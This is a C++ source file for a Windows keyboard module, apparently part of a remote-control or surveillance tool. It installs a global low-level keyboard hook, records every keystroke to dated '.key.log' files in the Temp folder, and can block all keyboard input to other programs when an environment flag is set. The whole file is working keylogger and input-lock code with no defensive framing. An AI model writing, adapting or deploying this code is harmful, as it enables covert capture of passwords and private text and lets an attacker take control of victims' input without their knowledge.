#include "keyboard.h"

#define KB_ENV L"RCDO_KBLOCK" // name of environment variable to search for

// map to track keystrokes that cannot be mapped with MapVirtualKeyExW
std::map<int, std::wstring> mapSpecialKeys = {
    {VK_BACK, L"[BACKSPACE]"},
    {VK_RETURN, L"[ENTER]"},
    {VK_SPACE, L"_"},
    {VK_TAB, L"[TAB]"},
    {VK_SHIFT, L"[SHIFT]"},
    {VK_LSHIFT, L"[SHIFT]"},
    {VK_RSHIFT, L"[SHIFT]"},
    {VK_CAPITAL, L"[CAPSLOCK]"},
    {VK_CONTROL, L"[CONTROL]"},
    {VK_LCONTROL, L"[CONTROL]"},
    {VK_RCONTROL, L"[CONTROL]"},
    {VK_MENU, L"[ALT]"},
    {VK_LWIN, L"[WIN]"},
    {VK_RWIN, L"[WIN]"},
    {VK_ESCAPE, L"[ESCAPE]"},
    {VK_END, L"[END]"},
    {VK_HOME, L"[HOME]"},
    {VK_LEFT, L"[LEFT]"},
    {VK_RIGHT, L"[RIGHT]"},
    {VK_UP, L"[UP]"},
    {VK_DOWN, L"[DOWN]"},
    {VK_PRIOR, L"[PG_UP]"},
    {VK_NEXT, L"[PG_DOWN]"},
    {VK_OEM_PERIOD, L"."},
    {VK_DECIMAL, L"."},
    {VK_OEM_PLUS, L"+"},
    {VK_OEM_MINUS, L"-"},
    {VK_ADD, L"+"},
    {VK_SUBTRACT, L"-"},
    {VK_INSERT, L"[INSERT]"},
    {VK_DELETE, L"[DELETE]"},
    {VK_PRINT, L"[PRINT]"},
    {VK_SNAPSHOT, L"[PRINTSCREEN]"},
    {VK_SCROLL, L"[SCROLL]"},
    {VK_PAUSE, L"[PAUSE]"},
    {VK_NUMLOCK, L"[NUMLOCK]"},
    {VK_F1, L"[F1]"},
    {VK_F2, L"[F2]"},
    {VK_F3, L"[F3]"},
    {VK_F4, L"[F4]"},
    {VK_F5, L"[F5]"},
    {VK_F6, L"[F6]"},
    {VK_F7, L"[F7]"},
    {VK_F8, L"[F8]"},
    {VK_F9, L"[F9]"},
    {VK_F10, L"[F10]"},
    {VK_F11, L"[F11]"},
    {VK_F12, L"[F12]"},
};

HHOOK ghHook;
KBDLLHOOKSTRUCT kbdStruct;
std::wofstream logFile;
std::mutex logFileMutex;

int KeyboardMod::requireAdmin(){
    return 0;
}

void KeyboardMod::start(){

    if (setHook()){
        return;
    }

    wprintf(L"Hook successfully installed!\n");

    std::thread monitorTimeThread(setLogFile);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){
    }
}

void KeyboardMod::kill(){

    releaseHook();
}

bool setHook(){

    // set the keyboard hook for all processes on the computer
    // runs the hookCallback function when hooked is triggered
    if (!(ghHook = SetWindowsHookExW(WH_KEYBOARD_LL, hookCallback, NULL, 0))){
        wprintf(L"%s: %d\n", "Hooked failed to install with error code", GetLastError());

        return 1;
    }

    return 0;
}

bool releaseHook(){

    return UnhookWindowsHookEx(ghHook);
}

void setLogFile(){
    // sets the global output file stream to the appropriate log file, creating one if it does not exist
    // log files are in the following format "dd/mm/yyyy.key.log", which is the current date

    logFileMutex.lock();

    if (logFile)
        logFile.close();

    time_t now = time(0);
    tm* localTime = localtime(&now);

    std::wstring tempPath = getEnvVar(L"%Temp%", L"");

    std::wstringstream logFileNameS;
    int localTime_day = localTime->tm_mday;
    int localTime_month = 1 + localTime->tm_mon;
    int localTime_year = 1900 + localTime->tm_year;
    logFileNameS << tempPath << "\\";
    logFileNameS << localTime_day << "-";
    logFileNameS << localTime_month << "-";
    logFileNameS << localTime_year << "";
    logFileNameS << ".key.log";

    std::string logFileName;

    for (auto c : logFileNameS.str()){
        logFileName += char(c);
    }

    std::cout << logFileName << std::endl;

    logFile.open(logFileName, std::ios_base::app);

    logFileMutex.unlock();

    time_t oneDayAhead = time(0) + 86400;
    tm* localTimeFuture = localtime(&oneDayAhead);

    SYSTEMTIME systemTime;
    systemTime.wDay = localTimeFuture->tm_mday;
    systemTime.wDayOfWeek = localTimeFuture->tm_wday;
    systemTime.wMonth = 1 + localTimeFuture->tm_mon;
    systemTime.wYear = 1900 + localTimeFuture->tm_year;
    systemTime.wHour = 0;
    systemTime.wMinute = 0;
    systemTime.wSecond = 0;
    systemTime.wMilliseconds = 0;

    FILETIME fileTime;
    SystemTimeToFileTime(&systemTime, &fileTime);

    LARGE_INTEGER dueTime;
    dueTime.HighPart = fileTime.dwHighDateTime;
    dueTime.LowPart = fileTime.dwLowDateTime;

    HANDLE hTimer = CreateWaitableTimer(NULL, 1, NULL);

    SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, 1);

    WaitForSingleObject(hTimer, INFINITE);

    setLogFile();
}

void logKeystroke(int vkCode){
    // KBDLLHOOKSTRUCT stores the keyboard inputs as Virtual-Key codes
    // resolution and logging of the keystrokes is performed here
    // also ignores mouse inputs

    std::wstringstream output;

    if (mapSpecialKeys.find(vkCode) != mapSpecialKeys.end()){
        std::wstring key = mapSpecialKeys.at(vkCode);

        output << key;
    }

    else{
        HKL kbLayout = GetKeyboardLayout(GetCurrentProcessId());

        // always lowercase because SHIFT before it will reflect the case
        wchar_t key = tolower(MapVirtualKeyExW(vkCode, MAPVK_VK_TO_CHAR, kbLayout));

        output << key;
    }

    logFileMutex.lock();
    logFile << output.str() << '\n';
    logFile.flush();
    logFileMutex.unlock();
}

LRESULT __stdcall hookCallback(int nCode, WPARAM wParam, LPARAM lParam){
    // function handler for all keyboard strokes

    std::wstring buffer = getEnvVar(KB_ENV, L"0");

    long int keyboardLocked = wcstol(buffer.c_str(), NULL, 2);

    if (keyboardLocked){
        if (nCode >= 0){
            if (wParam == WM_KEYDOWN){
                kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

                logKeystroke(kbdStruct.vkCode);
            }
        }

        // returns a non-zero value if the keyboard is locked to prevent the input from reaching other processes
        return 1;
    }

    return CallNextHookEx(ghHook, nCode, wParam, lParam);
}

int wmain(){
    KeyboardMod kbMod;
    kbMod.start();

    return 0;
}